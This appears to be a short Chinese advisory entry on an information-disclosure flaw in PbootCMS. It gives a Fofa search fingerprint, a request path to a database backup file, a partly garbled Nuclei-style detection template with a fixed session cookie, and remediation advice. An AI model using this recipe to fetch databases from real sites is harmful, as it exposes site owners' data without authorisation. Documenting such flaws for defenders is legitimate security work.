# PbootCMS前台存在信息泄露

- **系统**：PbootCMS　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`app.name="PbootCMS"`
- **请求**：`GET /static/backup/sql/pbootcms_v310.sql HTTP/1.1`

**请求体 / payload**
```
1. Fofa
app.name="PbootCMS"
2、隐患url,复现如下
id: PbootCM-sqlread
info:
name: PbootCM-sqlread
author: xxx
severity: high
requests:
- raw:
-
Host: {{Hostname}}
Cookie: lg=cn; PbootSystem=bkmjhrfecv12ku11nb68gh9etn
matchers:
- type: dsl
dsl:
- status_code==200 && contains(body,"数据库名")
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。